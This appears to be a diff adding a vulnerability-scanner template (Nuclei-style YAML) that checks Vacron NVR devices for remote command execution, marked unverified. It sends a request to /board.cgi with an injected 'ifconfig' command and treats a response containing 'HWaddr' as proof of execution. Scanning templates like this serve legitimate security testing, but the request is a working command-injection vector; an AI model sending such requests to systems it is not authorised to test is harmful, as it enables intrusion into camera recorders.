@@ -1,0 +1,30 @@
+id: vacron-board-rce
+info:
+  name: Vacron NVR-远程命令执行
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/58437/
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    tips: 搜集资产较少无法验证
+    repair:
+    version:
+  tags: vacron,rce
+
+http:
+  - raw:
+      - |
+        GET /board.cgi?cmd=ifconfig HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'HWaddr')
+        condition: and
